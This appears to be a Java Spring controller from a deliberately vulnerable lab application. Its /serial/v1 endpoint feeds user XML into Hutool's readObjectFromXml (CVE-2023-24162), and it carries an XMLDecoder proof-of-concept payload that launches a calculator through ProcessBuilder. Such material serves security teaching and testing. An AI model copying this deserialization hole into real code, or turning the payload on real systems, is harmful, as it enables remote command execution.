package com.jvwac.jgvwa.controller;

import cn.hutool.core.util.XmlUtil;
import io.swagger.annotations.ApiOperation;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RequestMapping(value = "/serial")
@RestController
public class SerialController {
    private static final Logger logger = LogManager.getLogger(SerialController.class);

    @ApiOperation(value = "cn.hutool.core.util.XmlUtil#readObjectFromXml", notes = "CVE-2023-24162\nhttps://gitee.com/dromara/hutool/issues/I6AEX2\nhttps://mvnrepository.com/artifact/cn.hutool/hutool-all/5.8.11")
    @RequestMapping(value = "/v1", method = RequestMethod.POST)
    public void V1(@RequestParam(value = "xmlStr") String xmlStr) {
        String payload = "<java>\n" +
                "    <object class=\"java.lang.ProcessBuilder\">\n" +
                "        <array class=\"java.lang.String\" length=\"1\">\n" +
                "            <void index=\"0\">\n" +
                "                <string>gnome-calculator</string>\n" +
                "            </void>\n" +
                "        </array>\n" +
                "        <void method=\"start\"></void>\n" +
                "    </object>\n" +
                "</java>\n";
        XmlUtil.readObjectFromXml(xmlStr);
    }
}
